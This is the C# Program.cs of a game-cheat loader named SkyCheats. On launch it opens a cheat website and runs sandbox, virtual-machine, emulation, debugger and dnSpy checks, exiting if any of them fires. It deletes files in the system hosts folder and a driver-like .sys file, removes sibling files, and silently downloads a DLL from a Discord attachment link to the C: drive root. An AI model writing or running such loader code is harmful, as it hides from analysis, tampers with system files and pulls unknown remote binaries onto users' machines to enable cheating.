using System;
using SkyCheats;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.IO.Ports;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using AntiDebugging.WinStructs;
using AntiDebugging;
using SkyCheats.LUserControls;
using System.Security.Principal;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using Microsoft.Win32;
using System.Drawing;

namespace SkyCheats
{

    
    internal static class Program
    {
        [DllImport("kernel32", EntryPoint = "SetProcessWorkingSetSize")]
        private static extern int OneWayAttribute([In] IntPtr obj0, [In] int obj1, [In] int obj2);

        internal static bool IsSandboxie()
        {
            return Sandboxie.IsSandboxie();
        }

        internal static bool IsVM()
        {
            return CommonAcl.SecurityDocumentElement();
        }

        internal static void IsDebugger()
        {
             DebuggerAcl.Run();
        }

        internal static bool IsdnSpyRun()
        {
            return DnSpy.ValueType();
        }

        internal static bool IsEmulation()
        {
            var millisecondsTimeout = new Random().Next(3000, 10000);
            var now = DateTime.Now;
            Thread.Sleep(millisecondsTimeout);
            if ((DateTime.Now - now).TotalMilliseconds >= millisecondsTimeout)
                return false;
            return true;
        }

        

        private static void WellKnownSidType()
        {
            var handle = Process.GetCurrentProcess().Handle;
            while (true)
            {
                do
                {
                    Thread.Sleep(16384);
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                } while (Environment.OSVersion.Platform != PlatformID.Win32NT);

                OneWayAttribute(handle, -1, -1);
            }
        }

        public static string desca;
        public static string deviceIda;
        

        static void sadsa()
        {
            Loader.Security.AntiDump.AntiDumpHandler.InitializeDump();
            //Loader.Security.AntiDLLInject.AntiDLLInject.InitializeDLLInject(); // bug doesnt work.
            Loader.Security.AntiDebug.Anti_Dbg.Initialize();
            //Loader.Security.AntiProcess.AntiProcessHandler.Checker(); // bug

            if (
            IsSandboxie() ||
            IsVM() ||
            IsdnSpyRun() ||
            IsEmulation() ||
            AntiDebug.DetachFromDebuggerProcess() ||
            AntiDebug.HideThreadFromDebugger(GetCurrentProcess()) ||
            AntiDebug.CheckDebuggerManagedPresent() ||
            AntiDebug.CheckDebuggerUnmanagedPresent() ||
            AntiDebug.CheckDebugPort() ||
            AntiDebug.CheckKernelDebugInformation() ||
            AntiDebug.CheckRemoteDebugger()
                )
            {

                Environment.Exit(0);
            }
        }


        static void host_clear()
        {
            try
            {
                string dosyayolu1 = @"C:\Windows\System32\drivers\etc\hosts.ics";
                string dosyayolu2 = @"C:\Windows\System32\drivers\etc\lmhosts.sam";
                string dosyayolu3 = @"C:\DD94687.sys";
                if (System.IO.File.Exists(dosyayolu1))
                {
                    File.SetAttributes(dosyayolu1, FileAttributes.Normal);
                    File.Delete(dosyayolu1);
                }
                if (System.IO.File.Exists(dosyayolu2))
                {
                    File.SetAttributes(dosyayolu2, FileAttributes.Normal);
                    File.Delete(dosyayolu2);
                }
                if (System.IO.File.Exists(dosyayolu3))
                {
                    Process[] processes = Process.GetProcessesByName(dosyayolu3);
                    foreach (var item in processes)
                    {
                        item.Kill();
                    }
                    File.SetAttributes(dosyayolu3, FileAttributes.Normal);
                    File.Delete(dosyayolu3);
                }
            }
            catch (Exception)
            {

            }
            
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        public static bool PingHost(string nameOrAddress)
        {
            
            try
            {
                Ping myPing = new Ping();
                PingReply reply = myPing.Send("192.168.1.3", 1000);
                if (reply != null)
                {
                    return true;

                }
            }
            catch
            {
                return false;
            }
            return false;
        }


       
        [STAThread]
        static void Main()
        {
            System.Diagnostics.Process.Start("https://cheatermad.com/");

            Thread sad = new Thread(sadsa);
            Thread sada = new Thread(IsDebugger);
            sad.Start();
            //sad.Join();
            sada.Start();


            string[] dirs = Directory.GetFiles(System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), "sky*");
           //MessageBox.Show(System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
            foreach (string dir in dirs)
            {
                if (dir != System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName)
                {
                    File.SetAttributes(dir, FileAttributes.Normal);
                    File.Delete(dir);
                }
                
            }



            host_clear();
                

            try
            {
                if (!File.Exists(@"C:/x1.dll"))
                {
                    WebClient myWebClient = new WebClient();
                    myWebClient.DownloadFile(@"https://cdn.discordapp.com/attachments/963741926920699914/966795143476822076/x1.dll", @"C:/x1.dll");
                }

            }
            catch (Exception)
            {
                
            }
            

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Main_Form());
        }
    }
}
